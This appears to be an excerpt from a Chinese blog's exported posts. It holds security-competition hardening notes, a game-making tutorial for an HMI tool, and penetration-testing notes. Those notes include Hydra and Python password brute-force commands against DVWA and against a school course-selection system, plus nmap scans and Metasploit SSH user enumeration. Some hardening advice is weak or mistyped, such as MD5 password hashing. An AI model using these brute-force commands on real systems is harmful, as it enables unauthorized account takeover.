title="msf"></a>msf</h2><ul><li><strong>msfdb init:</strong>  初始化数据库</li><li><strong>db_import /xx/xx.xml:</strong> 导入扫描结果</li><li><strong>services:</strong> 查看导入的数据</li><li><strong>host:</strong> 查看导入的主机数据</li><li><strong>exploit/multi/handler:</strong> 监听端口模块</li></ul><h2 id="wireshark（网络抓包工具）"><a href="#wireshark（网络抓包工具）" class="headerlink" title="wireshark（网络抓包工具）"></a>wireshark（网络抓包工具）</h2><ul><li><strong>tcp.connection.syn:</strong> 过滤出tcp协议</li><li><strong>ip.src==:’</strong> 过滤源地址</li><li><strong>ip.dst==:’’</strong> 过滤目标地址</li><li><strong>ip.addr==:</strong> 包括源地址和目标地址</li><li><strong>telnet contains “login’’</strong> 查看目标主机名</li><li><strong>tcp.port==3306:</strong> 过滤3306端口</li><li><strong>ftp-data:</strong> FTP下载的文件</li><li><strong>ftp contains “230” || ftp contains “success”:</strong> 230为FTP服务应答码，表示用户登录</li><li><strong>ftp contains “220” || ftp contains “FTP”:</strong> 220为FTP服务应答码，表示服务就绪</li></ul><h2 id="dissniff"><a href="#dissniff" class="headerlink" title="dissniff"></a>dissniff</h2><p><strong>dissniff -i eth0 -t 21/tcp=ftp,23/tcp=telnet</strong></p><h2 id="you-get"><a href="#you-get" class="headerlink" title="you-get"></a>you-get</h2><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">you-get -c C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\jleeq0k9.default-release\cookies.sqlite -i you-get -c C:\Users\askp1\AppData\Roaming\Mozilla\Firefox\Profiles\th5gw7dd.default-release\cookies.sqlite -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="设备题目"><a href="#设备题目" class="headerlink" title="设备题目"></a>设备题目</h1><h2 id="第一题（windows8）"><a href="#第一题（windows8）" class="headerlink" title="第一题（windows8）"></a>第一题（windows8）</h2><p><strong>1. 设置密码策略必须同时满足大小写字母、数字、特殊字符，最小密码长度不少于8个字符，密码最长使用期限为15天。将服务器上密码策略配置信息截图;</strong><br>开始——管理工具——本地安全策略——账户策略——密码策略<br><strong>2. 在用户登录系统时，应该有“For authorized users only”提示信息，将登录系统时系统弹出警告信息窗口截图;</strong><br>组策略（gpedit.msc）——计算机配置——windows设置——安全设置——本地策略——安全选项——交互式登录——标题和消息文字都设置一下<br><strong>3. 一分钟内仅允许5次登录失败的尝试，超过5次，登录帐号锁定1分钟,将账号锁定策略配置信息截图</strong><br>本地安全策略——账户策略——账户锁定策略<br><strong>4.设置远程桌面用户非活动会话连接超时应小于等于5分钟，将RDP-Tcp属性对应的配置界面截图；</strong><br>设置：组策略——计算机配置——管理模板——windows组件——远程桌面服务——远程桌面会话主机——会话时间限制——设置空闲会话的时间限制<br>查看：管理工具——远程桌面服务——远程桌面会话主机配置——双击RDP-Tcp——会话<br><strong>5.通过SSL（TLS 1.0）加密服务器的远程桌面服务，将RDP-Tcp属性对应的配置界面截图；</strong><br>管理工具——远程桌面服务——远程桌面会话主机配置——双击RDP-Tcp——常规<br><strong>6.仅允许超级管理员账号关闭系统，将关闭系统属性的配置界面截图；</strong><br>本地安全策略——本地策略——用户权限分配——关闭系统<br><strong>7.开启IIS的日志审计记录，日志文件保存格式为W3C,只记录日期、时间、客户端IP地址、用户名、服务器端口、方法，将W3C日志记录字段的配置界面截图；</strong><br>开始——管理工具——IIS管理器——日志——格式——选择字段<br><strong>8.设置网站的最大并发连接数为1000，网站连接超时为60s，将编辑网站限制的配置界面截图；</strong><br>网站——IIS的站点——配置——限制<br><strong>9.禁用IIS内核缓存，避免对方利用ms15_034漏洞进行DOS攻击，出现蓝屏的现象，将编辑输出缓存设置的配置界面截图；</strong><br>开始——管理工具——IIS管理器——输出缓存——编辑功能设置<br><strong>10.设置user1用户只能在上班时间（周一至周五的9:00~18:00）可以登录。将user1的登录时间配置界面截图。</strong><br>net user user1 /times:M-F,9:00-18:00         （M、T、W、Th、F、Sa、Su）</p><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><strong>1.设置最小密码长度不少于8个字符，密码最长使用期限为15天。将/etc/login.defs配置文件中对应的部分截图;</strong><br>/etc/login.defs<br><strong>2.设置在用户登录系统时，会有“For authorized users only”提示信息，将登录系统时系统弹出提示信息界面截图;</strong><br>/etc/issue  配置文件末尾添加 （存疑）<br>只是这样修改的话在 ssh 连接时是不会有提示信息的，需要修改 ssh 配置文本<br>vim /etc/ssh/sshd_config<br>在下方添加一行 Banner /etc/ssh/banner<br>touch /etc/ssh/banner<br>vim /etc/ssh/banner<br>在文件内添加需要提示的提示信息，完成后集团的重启 SSH 服务 systemctl restart sshd<br><strong>3.设置root用户的计划任务。每天早上7:50自动开启vsftpd服务，22点50时关闭；每周六的7:30时，重新启动vsftpd服务。使用crontab –l 查看计划任务，将回显结果截图；</strong></p><ul><li>crontab -选项：</li><li>-u　　指定用户设定计划</li><li>-e　　进入用户编辑计划</li><li>-l　　列出用户任务计划</li><li>-r　　删除用户任务计划<br>crontab -u root -l<br>50 7 * * * /sbin/service vsftpd start<br>50 22 * * * /sbin/service vsftpd stop<br>30 7 * * 6 /sbin/service vsftpd restart</li></ul><p><strong>4.禁止匿名用户登录vsftpd服务，将/etc/vsftpd/vsftpd.conf配置文件中对应的部分截图；</strong><br>anonymous_enable=no<br><strong>5.限制客户端连接vsftpd服务时，同一个IP最多只能打开两个连接，将/etc/vsftpd/vsftpd.conf配置文件中对应的部分截图；</strong><br>在文件末尾添加：max_per_ip=2<br><strong>6.将SSH服务的端口号修改为2222 ,使用命令netstat -anltp | grep sshd查看SSH服务端口信息，将回显结果截图；</strong><br>Port 2222<br>service sshd restart<br><strong>7.禁止root用户通过SSH远程登录，将/etc/ssh/sshd_config 配置文件中对应的部分截图；</strong><br>RermitRootLogin NO<br><strong>8.禁止mysql服务以管理员权限的账号运行，将/etc/my.cnf配置文件中对应的部分截图；</strong><br>在my.cnf配置文件中配置user=mysql<br><strong>9.删除默认数据库test, 然后使用show databases;命令查看当前的数据库信息，将回显结果截图；</strong><br>drop database test<br><strong>10.将数据库用户user1的密码使用MD5加密，然后在数据库中使用select password from user where user=’user1’;命令查看user1的密码，将回显结果截图。</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">update user set password<span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token char">'P@ssw0rd1!'</span><span class="token punctuation">)</span> where User<span class="token operator">=</span><span class="token char">'user1'</span><span class="token punctuation">;</span>flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="A-2任务二-数据库加固（Data）"><a href="#A-2任务二-数据库加固（Data）" class="headerlink" title="A-2任务二 数据库加固（Data）"></a>A-2任务二 数据库加固（Data）</h2><p><strong>1.以普通账户mysql安全运行Mysql，禁止Mysql以管理员账号权限运行；</strong><br>修改Mysql配置文本，<code>vim /etc/my.cnf</code><br>在 [mysqld] 下方新增一行 <code>user=mysql</code> (如果没有 mysql 用户需要自行创建)<br>修改完后重启Mysql服务，<code>service mysqld restart</code><br><strong>2.删除默认数据库(test)；</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">show databases<span class="token punctuation">;</span>create database test<span class="token punctuation">;</span>drop database test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>3.改变默认Mysql管理员用户为SuperRoot；</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">select User<span class="token punctuation">,</span>Password from user<span class="token punctuation">;</span>update user set User <span class="token operator">=</span> <span class="token char">'SuperRoot'</span> where User <span class="token operator">=</span> <span class="token char">'root'</span><span class="token punctuation">;</span><span class="token comment">//将当前user和privilige表中的用户信息/权限设置从mysql库 (MySQL数据库的内置库)中提取到内存里</span>flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4.使用Mysql内置MD5加密函数加密用户user1的密码为(P@ssw0rd1!);</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">update user set password<span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token char">'P@ssw0rd1!'</span><span class="token punctuation">)</span> where User<span class="token operator">=</span><span class="token char">'user1'</span><span class="token punctuation">;</span>flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>5.赋予user1用户对数据库所有表只有select,insert,delete,update权限；</strong></p><pre class="line-numbers language-none"><code class="language-none">show grants for 'user1'@'localhost';grant select,insert,delete,update on *.* to 'user1'@'localhost';flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>6.对忘记mysql数据库root管理员密码进行重置操作</strong><br><code>vim /etc/my.cnf</code><br>在[mysqld]下面加入<br><code>skip-grant-tables</code> (跳过权限检查启动)<br>修改完后重启Mysql服务，<code>service mysqld restart</code><br>mysql –u root –p<br>use mysql;<br><code>update user set Password='123.com' where User='root';</code><br>flush privileges;</p><h2 id="A-3任务三-Web安全加固"><a href="#A-3任务三-Web安全加固" class="headerlink" title="A-3任务三 Web安全加固"></a>A-3任务三 Web安全加固</h2><p><strong>1.为了防止web中.mdb数据库文件非法下载请对Web配置文件进行安全加固</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— Default Web Site —— 请求筛选 —— 拒绝文件扩展名，添加扩展名.mdb<br><strong>2.限制目录执行权限，对picture 和 upload 目录是指执行权限为无</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— Default Web Site —— picture/upload —— 处理程序映射—— 编辑功能权限，取消勾选<strong>执行</strong><br><strong>3.开启IIS的日志审计记录(日志文件保存格式为W3C,只记录日期、时间、客户IP地址、用户名、方法)</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— web —— 日志，格式选择W3C，点击选择字段，只勾选日期、时间、客户端IP地址、用户名、方法<br><strong>4.为了减轻网站负载，设置网站最大并发连接数为1000</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— 右侧-设置网站默认设置，设置限制连接数值1000<br><strong>5.防止文件枚举漏洞枚举网络服务器根目录文件，禁止IIS短文件名泄露</strong><br>CMD 执行命令 fsutil behavior set disable8dot3 1<br><strong>6.关闭IIS的WebDAV功能增强网站的安全性</strong><br>管理工具 —— IIS管理器 ——主机名(WIN-FVEF7SF4TF5) —— ISAPI 和 CGI 限制，右键WebDav，点击拒绝</p><h2 id="A-6任务六-服务加固SSH-VSFTPD（P9Linux渗透）"><a href="#A-6任务六-服务加固SSH-VSFTPD（P9Linux渗透）" class="headerlink" title="A-6任务六 服务加固SSH\VSFTPD（P9Linux渗透）"></a>A-6任务六 服务加固SSH\VSFTPD（P9Linux渗透）</h2><p><strong>1. 修改ssh服务端口为2222；</strong><br>   修改ssh服务配置文件，<code>vim /etc/ssh/sshd_config</code><br>   查找 Port, 将注释取消，并将Port的值22改为2222<br><strong>2. ssh禁止Root用户远程登录；</strong><br>   vim中<code>/关键词</code>进行查找<br>   查找 <code>PermitRootLogin</code>, 修改值为no<br><strong>3. vsFTPd禁止匿名用户上传；</strong><br>   将 <code>anon_upload_enable</code> 注释取消，并将值改为 NO,<br>   并重启vsftpd服务<code>service vsftpd restart</code><br><strong>4. 激活 vsFTPd 上传下载日志；</strong><br>   将 <code>xferlog_enable</code> 的值设置为 YES<br>   #启用改选项，系统会记录上传下载的日志。默认情况下，日志文件为 /var/log/vsftpd.log<br><strong>5. vsFTPd 同一个IP只能连接两个；</strong><br>   在文件底部新增一行<code> max_per_ip=2</code>，并重启vsFTPd 服务.<br><strong>6. vsFTPd 将使客户端连接时的端口范围在 50000 和 60000 之间；</strong><br>   在文件底部新增两行，并重启vsFTPd服务<br>   <code>pasv_min_port=50000</code><br>   <code>pasv_max_port=60000</code><br><strong>7. vsFTPd 使本地用户登录活动范围限制在home目录；</strong><br>   取消 <code>chroot_local_user</code> 和 <code>chroot_list_enable</code> 的注释，<br>   将 <code>chroot_local_user</code> 和 <code>chroot_list_enable</code> 的值分别改为 YES 和 NO</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小游戏开发入门</title>
      <link href="/2022/11/11/%E5%B0%8F%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
      <url>/2022/11/11/%E5%B0%8F%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1、航天飞机"><a href="#1、航天飞机" class="headerlink" title="1、航天飞机"></a>1、航天飞机</h1><ul><li>1.新建工程（记得先在桌面创建一个自己的文件夹作为工程目录）</li><li>2.点击开发进入开发界面</li><li>3.选中画面—新建—填写画面名称</li><li>4.右键—画面属性—背景色</li><li>5.图库—打开图库—开关（双击）</li><li>6.切换到工程浏览器—系统配置—设置开发系统—设置运行系统—主画面配置</li><li>7.文件—全部存—切换到view</li><li>8.双击开关—点击变量名旁边的？—新建变量—变量名是加油开关，变量类型是内存离散—选中刚才创建的发射开关变量—点击确定</li><li>10.图库—自己选一个好看的油罐吧（反应器）</li><li>11.双击油罐—点？号—新建变量—变量名：油量，变量类型：内存整数—关联刚才新建的变量</li><li>12.工程浏览器—数据词典—修改油量的初始值为100</li><li>13.右键—画面属性—命令语言<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\加油开关<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    \\本站点\油量 <span class="token operator">=</span> \\本站点\油量 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>14.图库里面选择一个好看的仪表盘—双击仪表—点？号关联上油量</li><li>15.工程浏览器-系统配置-设置开发系统-设置运行系统-特殊-运行系统基准频率-100毫秒</li><li>16.右键—画面属性—命令语言-每100毫秒</li><li>17.工具箱—多边形—画一个火箭（最后一个点双击结束）</li><li>18.在工具箱中画一条管道—选中管道—流动—流动的条件是<code>\\本站点\加油开关 &amp;&amp; \\本站点\油量&gt;0</code></li><li>19.在图库里选一个按钮，双击按钮，点？，新建变量，发射按钮，并且双击关联上。</li><li>20.双击火箭—垂直移动—点？—新建变量—火箭移动距离（整数，初始值为0）—双击关联</li><li>21.右键—画面属性—命令语言<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\油量<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> \\本站点\发射开关<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    \\本站点\火箭移动距离 <span class="token operator">=</span> \\本站点\火箭移动距离 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>22.画一个好看的火焰，双击火焰，隐含，\本站点\火箭移动距离 == 0时<strong>隐含</strong><h1 id="2、爱心表白"><a href="#2、爱心表白" class="headerlink" title="2、爱心表白"></a>2、爱心表白</h1></li></ul><ol><li><p>工程浏览器—新建一个画面—爱心表白</p></li><li><p>切换到工程浏览器—系统配置—设置开发系统—设置运行系统—主画面配置—设置爱心表白为主画面</p></li><li><p>工程浏览器—数据库—数据词典—新建—灯1~灯5（内存离散）</p></li><li><p>图库里面自己选几个好看的灯</p></li><li><p>把几个灯分别关联上各自的变量</p></li><li><p>用工具箱里的多边形画一个桃心</p></li><li><p>双击桃心—按下时</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">\\本站点\灯<span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>右键—画面属性—命令语言</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//第四次循环执行</span><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\灯<span class="token number">4</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    \\本站点\灯<span class="token number">5</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//第三次循环执行</span><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\灯<span class="token number">3</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    \\本站点\灯<span class="token number">4</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//第二次循环执行</span><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\灯<span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    \\本站点\灯<span class="token number">3</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//第一次循环执行</span><span class="token keyword">if</span><span class="token punctuation">(</span>\\本站点\灯<span class="token number">1</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    \\本站点\灯<span class="token number">2</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>工具箱—点位图—右键—从文件中加载（记得选中ALL files）</p></li><li><p>工具箱—文本—写几个表白文字</p></li><li><p>分别给图片和文字添加隐含效果，隐含条件为灯5</p></li><li><p>右键爱心—图素位置—图素前移</p></li><li><p>再给爱心添加闪烁效果，闪烁条件灯5</p></li><li><p>扩展任务：要求灯全部亮起后，在依次熄灭，循环往复</p><h1 id="3、到五秒就停下！"><a href="#3、到五秒就停下！" class="headerlink" title="3、到五秒就停下！"></a>3、到五秒就停下！</h1></li><li><p>新建一个画面</p></li><li><p>工程浏览器-系统配置-设置开发系统-设置运行系统-主画面配置</p></li><li><p>工程浏览器-数据库-数据词典-计时（实数）、开始游戏（离散）、游戏成功判定（离散）、游戏失败判定（离散）</p></li><li><p>在画面中使用工具箱制作一个按钮—开始游戏</p></li><li><p>双击开始游戏按钮—按下时</p><pre class="line-numbers language-none"><code class="language-none">if(\\本站点\开始游戏==0){\\本站点\开始游戏 = 1;\\本站点\计时 = 0;}else{\\本站点\开始游戏 = 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用工具箱制作一个文本，双击文本，模拟值输出“计时”（注意输出一位小数）</p></li><li><p>右键—画面属性-命令语言</p><pre class="line-numbers language-none"><code class="language-none">// 如果按钮按下就开始计时if (\\本站点\开始游戏==1){\\本站点\计时 = \\本站点\计时 + 0.1;}// 成功判定if(\\本站点\计时==1.0 &amp;&amp; \\本站点\开始游戏==0){    \\本站点\游戏成功判定=1;}else{    \\本站点\游戏成功判定=0;}// 失败判定if(\\本站点\计时!=1.0 &amp;&amp; \\本站点\开始游戏==0 &amp;&amp; \\本站点\计时!=0){    \\本站点\游戏失败判定 = 1;}else{    \\本站点\游戏失败判定 = 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4、幸运大转盘"><a href="#4、幸运大转盘" class="headerlink" title="4、幸运大转盘"></a>4、幸运大转盘</h1></li><li><p>产生随机数：工程浏览器-数据库-数据词典-新建变量随机数（I/O整数）—连接设备—COM1—新IO设备—PLC—亚控—仿真PLC——COM—名称随便填—COM口随便选—地址是0-10随便一个—寄存器RADOM100—数据类型SHORT</p></li><li><p>新建指针的角度、抽奖值（都是内存整数）</p></li><li><p>画一个转盘</p></li><li><p>画一个指针，指针关联变量（指针的角度）</p></li><li><p>新建一个开始按钮，按下去的时候</p><pre class="line-numbers language-none"><code class="language-none">  \\本站点\抽奖值 = \\本站点\随机值;\\本站点\指针的角度 = 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><p>5.右键—画面命令语言</p><pre class="line-numbers language-none"><code class="language-none">  if(\\本站点\指针的角度&lt;\\本站点\抽奖值){\\本站点\指针的角度 = \\本站点\指针的角度 + 1;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小游戏开发入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全Web渗透</title>
      <link href="/2022/11/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8Web%E6%B8%97%E9%80%8F/"/>
      <url>/2022/11/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8Web%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h1><h2 id="一、爆破HTTP表单密码"><a href="#一、爆破HTTP表单密码" class="headerlink" title="一、爆破HTTP表单密码"></a>一、爆破HTTP表单密码</h2><h3 id="1-Hydra爆破"><a href="#1-Hydra爆破" class="headerlink" title="1.Hydra爆破"></a>1.Hydra爆破</h3><ol><li>启动OWASP漏洞靶机</li><li>输入IP地址打开网页</li><li>打开Damn Vulnerable Web Application</li><li>开始抓包，在登录界面按下F12，选中Network选项卡，随便输入账号密码，点击Login。</li><li>成功抓取到login.php，记录Request URL、Form Data以及Response</li><li>打开kali虚拟机，右键打开终端</li></ol><pre class="line-numbers language-none"><code class="language-none">hydra -l admin -P passw.txt 192.168.148.130 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed" -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-l</code>表示单个用户名（使用<code>-L</code>表示用户名字典）<br><code>-P</code>表示使用密码字典<br><code>-V</code>用于显示每次尝试的详细输出<br><code>-o</code>表示保存结果到文件<br><code>-f</code>表示只要破解到第一个有效密码就停止<br><code>:</code>后是登录失败表单返回的信息</p><h3 id="2-Python爆破"><a href="#2-Python爆破" class="headerlink" title="2.Python爆破"></a>2.Python爆破</h3><p>登录进DVWA漏洞靶机之后，靶机给我们提供了一个暴力破解密码的接口，就是第四个，Brute Force<br>为了深入理解爆破原理，这次我们不用工具，自己写代码进行破解，这里使用最简单的Python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspwds <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"password.txt"</span><span class="token punctuation">)</span><span class="token keyword">for</span> pwd <span class="token keyword">in</span> pwds<span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://192.168.26.131/dvwa/vulnerabilities/brute/"</span>    <span class="token comment"># Python strip() 方法用于移除字符串头尾指定的字符（默认为空格或换行符）或字符序列。</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>     params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span>pwd<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Login"</span><span class="token punctuation">:</span><span class="token string">"Login"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>     <span class="token comment"># 身份信息，即cookie，必须是最新的，有效的</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span>"security<span class="token operator">=</span>low<span class="token punctuation">;</span> \        PHPSESSID<span class="token operator">=</span>jbvcllt5hbruibl548pco9pq71<span class="token punctuation">;</span> acopendivids<span class="token operator">=</span>swingset<span class="token punctuation">,</span>jotto<span class="token punctuation">,</span>phpbb2<span class="token punctuation">,</span>redmine<span class="token punctuation">;</span> acgroupswithpersist<span class="token operator">=</span>nada"<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment">#print(resp.text)</span>    <span class="token keyword">if</span> <span class="token string">'Username and/or password incorrect.'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'破解失败：'</span><span class="token operator">+</span>pwd<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'破解成功：'</span><span class="token operator">+</span>pwd<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>pwds<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和之前一样，抓包，然后模拟浏览器发送请求，唯一不同的就是需要注意，发送的请求需携带身份信息，因为这个操作必须在登录状态才可以执行</p><h3 id="3-BurpSuite爆破"><a href="#3-BurpSuite爆破" class="headerlink" title="3.BurpSuite爆破"></a>3.BurpSuite爆破</h3><ol><li><p>在Kali中打开BurpSuite，设置代理（proxy）的设置的端口为允许所有端口</p></li><li><p>打开火狐浏览器-设置-网络设置-手动配置代理-设置为Kali机器的IP</p></li><li><p>在火狐浏览器中提交表单，请求就已经被代理服务器拦截了</p></li><li><p>回到BurpSuite可以看到被拦截包的具体内容，右键，Send to Intruder</p></li><li><p>打开Intruder选项卡，clear$，add$</p></li><li><p>在Payload载荷中添加进字典，就可以开始爆破了</p></li></ol><h4 id="几种攻击模式"><a href="#几种攻击模式" class="headerlink" title="几种攻击模式"></a>几种攻击模式</h4><ol><li>Sniper 狙击手<br>只能破解一个字段，即只能选择一个payloadset。</li><li>Battering ram 攻城锤<br>不管有几个参数，都只能用相同的字典值</li><li>Pitchfork 草叉<br>有几个参数就需要设置几个字典，而且会按顺序匹配同时使用，不会交叉验证。<br>如果两个payload的数量不匹配，以少的为准，多余的丢弃。</li><li>Cluster bomb 榴霰弹<br>产生笛卡尔积，简单来说就是和草叉相反。</li></ol><h3 id="4-爆破机房选课系统登录密码"><a href="#4-爆破机房选课系统登录密码" class="headerlink" title="4.爆破机房选课系统登录密码"></a>4.爆破机房选课系统登录密码</h3><p>先不要看答案，自己试一试</p><pre class="line-numbers language-none"><code class="language-none">hydra -l pwh -p password.txt 10.163.72.11 http-post-form "/index/index/login.html:username=^USER^&amp;password=^PASS^:失败" -V -o JJ.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、爆破SSH密码"><a href="#二、爆破SSH密码" class="headerlink" title="二、爆破SSH密码"></a>二、爆破SSH密码</h2><h3 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h3><ol><li>ping扫描  <code>—sP</code><pre class="line-numbers language-none"><code class="language-none">nmap -sP 10.163.72.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>指定端口范围  <code>—p m-n</code><pre class="line-numbers language-none"><code class="language-none">nmap -p 22,80 10.163.72.55 #-p- 表示对所有端口进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>服务版本探测 <code>-sV</code><pre class="line-numbers language-none"><code class="language-none">nmap -p 22,80 10.163.72.55 -sV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>全面扫描 <code>-A</code><pre class="line-numbers language-none"><code class="language-none">nmap -A 10.163.72.55<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>保存结果<pre class="line-numbers language-none"><code class="language-none">nmap -sn 101.37.79.1/24 -oX JJ.xml #默认保存在nmap安装根目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>其他参数</li></ol><ul><li>端口状态：<a href="https://blog.csdn.net/lee244868149/article/details/39177669">https://blog.csdn.net/lee244868149/article/details/39177669</a></li><li><code>-Pn</code>参数可以停止ICMP请求，避免触发防火墙的安全机制</li><li><code>-v</code>表示需要持续返回解析的信息</li><li><code>-T4</code>表示采用什么速度进行探测，范围0-5</li></ul><h3 id="2-用户名枚举"><a href="#2-用户名枚举" class="headerlink" title="2.用户名枚举"></a>2.用户名枚举</h3><ol><li>在kail里输入msfconsole打开msf，退出输入exit</li><li>因为msf中的模块太多了，我们想要找ssh有关的模块，只有使用搜索功能。<pre class="line-numbers language-none"><code class="language-none">search ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>找到用户枚举的模块<pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/ssh/ssh_enumusers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看参数设置<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>设置必要的参数<pre class="line-numbers language-none"><code 